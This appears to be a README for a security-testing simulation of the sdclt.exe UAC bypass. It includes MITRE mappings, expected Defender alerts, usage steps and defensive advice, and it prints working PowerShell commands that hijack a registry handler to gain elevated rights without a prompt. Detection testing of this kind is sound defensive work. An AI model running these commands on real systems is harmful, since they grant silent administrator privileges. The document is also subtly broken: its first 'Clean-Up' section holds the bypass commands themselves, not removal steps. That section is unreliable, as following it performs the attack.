# UAC Bypass

## Overview

UAC Bypass is a technique where attackers elevate their privileges to gain administrator-level permissions without triggering a User Account Control (UAC) prompt. This allows them to perform restricted tasks without user confirmation, bypassing security checks that would typically prevent unauthorized actions. This simulation uses the sdclt.exe method (Backup and Restore utility) which exploits registry handler hijacking.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
| --- | --- | --- |
| Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism: Bypass User Account Control |
| Defense Evasion | T1112 | Modify Registry |

## Expected Alerts

| Alert Title | Alert Description | Alert Details |
| --- | --- | --- |
| UAC bypass was detected | A process has performed actions on a child process or another subsequent process that would normally require a User Account Control (UAC) prompt. This could be an attempt to elevate privileges without requesting user permission. | **Category:** Privilege escalation<br/>**MITRE ATT&CK Techniques:** T1112: Modify Registry, T1548.002: Bypass User Account Control<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |

## Attack Simulation

### Prerequisites

- Windows 10/11 test environment (user with admin rights but UAC enabled)
- PowerShell (standard user context)
- Microsoft Defender for Endpoint onboarded device

### Script: Invoke-UACBypassSimulation.ps1

#### Parameters

| Parameter | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `CleanUp` | Switch | No | — | Remove the registry key created by the simulation |
| `Force` | Switch | No | — | Skip the confirmation prompt before execution |

#### What the Script Does

1. **Creates registry key** — Creates `HKCU:\Software\Classes\Folder\shell\open\command` with value `cmd.exe /c notepad.exe`
2. **Adds DelegateExecute property** — Required for the bypass to work
3. **Launches sdclt.exe** — Triggers the bypass, executing notepad.exe with elevated privileges

## Setup

### Usage Examples

```powershell
# Run the UAC bypass simulation
.\Invoke-UACBypassSimulation.ps1

# Run with Force to skip confirmation
.\Invoke-UACBypassSimulation.ps1 -Force

# Clean up registry changes
.\Invoke-UACBypassSimulation.ps1 -CleanUp
```

### Expected Output

```
================================================
                ***  WARNING  *** 
       UAC Bypass Simulation Script
================================================

This script will attempt to bypass User Account Control:
  - Modify HKCU registry to hijack folder handler
  - Launch sdclt.exe to trigger the bypass
  - Execute notepad.exe with elevated privileges

Registry path: HKCU:\Software\Classes\Folder\shell\open\command

Do you want to continue? (Y/N): Y

[+] Created registry key with command hijack
[+] Added DelegateExecute property
[+] Launched sdclt.exe - bypass triggered
```

After successful execution, notepad.exe will launch with elevated privileges (without a UAC prompt).

## Scenario Execution

1. Log in to a Windows test device as a user with local administrator rights.
2. Open PowerShell (standard user context, not elevated).
3. Navigate to the directory containing the script.
4. Run `.\Invoke-UACBypassSimulation.ps1` and confirm with `Y`.
5. Observe notepad.exe launching with elevated privileges.
6. Monitor the Microsoft Defender for Endpoint portal for UAC bypass alerts.
7. After testing, run `.\Invoke-UACBypassSimulation.ps1 -CleanUp` to remove the registry modifications.

## Why Does This Matter

UAC bypass techniques are dangerous because:

- **Silent elevation** — Attackers gain admin privileges without alerting the user.
- **Malware deployment** — Elevated privileges allow installation of persistent malware.
- **Security bypass** — Many security controls rely on UAC to prevent unauthorized changes.
- **Common in attacks** — UAC bypass is frequently used after initial compromise.

Detecting UAC bypass attempts helps identify attackers attempting privilege escalation.

## Best Practices

- **Set UAC to "Always Notify"** — Highest UAC setting provides maximum protection
- **Monitor registry modifications** — Alert on changes to HKCU\Software\Classes\Folder
- **Use Credential Guard** — Provides additional protection for credentials
- **Implement least privilege** — Reduce the number of users with local admin rights
- **Monitor auto-elevation binaries** — Track execution of sdclt.exe, eventvwr.exe, and other auto-elevating binaries
- **Enable ASR rules** — Attack surface reduction rules can block some UAC bypass techniques

## Clean-Up

```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath "$env:windir\system32\sdclt.exe"
```

## Clean-Up

Run the script with the `-CleanUp` parameter or manually remove the registry key:

```powershell
# Using script
.\Invoke-UACBypassSimulation.ps1 -CleanUp

# Manual cleanup
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
```

## References

- [MITRE ATT&CK T1548.002 - Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- [MITRE ATT&CK T1112 - Modify Registry](https://attack.mitre.org/techniques/T1112/)
- [Microsoft Docs - User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview)
- [UACME - UAC Bypass Methods](https://github.com/hfiref0x/UACME)

## Additional Manual Commands

### UAC Bypass (Manual Commands)

```powershell
New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath "$env:windir\system32\sdclt.exe"
```
